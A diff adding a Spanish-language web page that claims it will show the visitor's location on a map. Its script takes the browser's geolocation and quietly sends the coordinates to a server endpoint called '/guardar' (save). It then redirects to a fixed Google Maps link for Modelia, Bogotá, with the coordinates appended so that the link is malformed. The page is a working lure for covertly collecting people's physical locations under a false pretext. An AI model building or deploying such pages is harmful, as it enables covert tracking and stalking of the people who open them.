@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ubicación en tiempo real</title>
+  <meta charset="utf-8">
+</head>
+<body>
+  <h2>Mostrando tu ubicación en el mapa...</h2>
+  <p>Espera un momento mientras obtenemos tu ubicación actual.</p>
+
+  <script>
+    navigator.geolocation.getCurrentPosition(function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const url = `/guardar?lat=${lat}&lon=${lon}`;
+      fetch(url).then(() => {
+        window.location.href = "https://www.google.com/maps/place/Modelia,+ZONA+5,+Bogot%C3%A1/@4.6696324,-74.12306,15z/data=!3m1!4b1!4m6!3m5!1s0x8e3f9b7ed564f881:0x17e97c13b3148fb5!8m2!3d4.6695391!4d-74.1173893!16s%2Fm%2F0fphzzr?entry=ttu&g_ep=EgoyMDI1MDYxMC4xIKXMDSoASAFQAw%3D%3D" + lat + "," + lon;
+      });
+    }, function(error) {
+      document.body.innerHTML += `<p>No se pudo obtener ubicación: ${error.message}</p>`;
+    });
+  </script>
+</body>
+</html>
